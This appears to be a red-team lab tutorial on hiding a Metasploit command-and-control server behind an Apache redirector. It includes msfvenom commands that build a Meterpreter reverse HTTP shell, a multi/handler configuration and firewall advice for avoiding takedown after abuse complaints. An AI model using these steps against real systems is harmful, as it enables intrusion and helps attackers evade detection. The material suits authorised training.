## There's Always Room for Improvement

As you may have guessed, Metasploit itself is not that great of a C2 server for advanced adversary operations. It's not as flexible as one would desire; you cannot configure agents to beacon out every X seconds with Y jitter. A Next-Generation Firewall could quickly pick up on this C2 traffic, seeing it's a constant stream of traffic. In addition, anyone could connect to an HTTP/HTTPS listener and find out relatively quickly what is going on.

## Command and Control Redirectors

### What is a Redirector?

Before we dive into configuring a Redirector, first, what is it? A Redirector is exactly as it sounds. It's a server that "Redirects" HTTP/HTTPS requests based on information within the HTTP Request body. In production systems, you may see a "Redirector" in the form of a Load Balancer. This server often runs Apache 2 or NGINX. For this lab, we will be leveraging Apache and some of its modules to build a Redirector.

Jumping back into Metasploit, we can set up some basic configurations on Metasploit to allow for more advanced configurations. In this task, we will be setting up a Redirector. Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. The diagram below illustrates how communications between a victim and a C2 server happen.

### Illustration of a C2 and Redirector with victims calling back

Usually, when you have a C2 callback, you may set the callback host to a Domain, let's say `admin.tryhackme.com`. It's very common for your C2 Server to get reported when a user files a complaint. Usually, the server gets taken down fairly quickly, sometimes in as little as 3 hours and as much as 24. Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound.

But how does this stop the C2 Server from being taken down? Surely if someone fingerprinted Cobalt Strike on your C2 Server, someone would file a complaint, and it would get taken down. This is true, so you should set up a Firewall to only allow communication to and from your redirector(s) to mitigate any potential risks.

### Illustration of how a C2 Server and a Redirector should interact

## How is a Redirector Setup?

Before we dive into configuring a redirector, we must first understand how one is set up; we will be aligning this to the tools we have available, which are Metasploit and Apache2. In Apache, we will be leveraging a module called `mod_rewrite` (or the Rewrite module). This module allows us to write rules to forward requests to internal or external hosts on a server based on specific HTTP headers or content. We will need to use several modules to configure our Redirector. The following modules must be enabled:

- `rewrite`
- `proxy`
- `proxy_http`
- `headers`

**Note:** If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that Apache listens on in `/etc/apache2/ports.conf`. You must do this before starting the Apache 2 service, or it will fail to start.

### Enabling Modules and Starting Apache2

```sh
root@kali$ apt install apache2
root@kali$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
```

## Generating a Payload with Modified Headers

Using Meterpreter, we have the ability to configure various aspects of the HTTP Request, for example, the User-Agent. It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads.

```sh
root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the HTTP filter to only view HTTP requests. After it's started capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.

## Modifying the Apache Config File

On Debian-based systems, the default config can be found at `/etc/apache2/sites-available/000-default.conf`.

### Modified Apache2 Config

```sh
root@kali$ cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'

<VirtualHost *:80>

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:8080/"

	<Directory>
		AllowOverride All
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

## Setting Up Exploit/Multi/Handler

```sh
root@kali$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
msf6 exploit(multi/handler) > set OverrideLPORT 80
msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
msf6 exploit(multi/handler) > set OverrideRequestHost true
msf6 exploit(multi/handler) > run
```

After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector!